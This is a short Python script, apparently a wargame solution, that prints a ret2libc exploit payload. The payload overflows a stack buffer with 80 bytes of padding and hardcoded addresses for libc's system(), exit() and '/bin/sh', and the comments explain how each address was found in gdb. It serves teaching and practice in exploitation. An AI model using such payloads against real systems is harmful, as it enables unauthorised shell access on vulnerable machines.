padding = 'A'*80

# From here, we control the return addr in the stack
# So let's make a ret2libc attack, since we can't diretly return to addresses in the stack

# We can figure out the address of the libc 'system' function by executing 'print system' in gdb
system_addr = '\xb0\xff\xec\xb7'

# The same for the 'exit' function
exit_addr = '\xc0\x60\xec\xb7'

# Now we need the string parameter for the 'system' function, and we want it to be '/bin/sh'. I firstly tried to use the SHELL environment variable (which is in the stack) to obtain this string, but got stuck again when its address changed in and out gdb

# So we have to find it another way. By executing 'strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"' we can obtain the offset (from libc starting address) to find the string 'bin/sh' in this library

# Then we can find the starting address of libc by executing 'info proc map' in gdb
# That address + the offset (x/s <libc-address>+<offset>) gives us the address of /bin/sh
shell_str_addr = '\xbf\x63\xfb\xb7'

print padding + system_addr + exit_addr + shell_str_addr

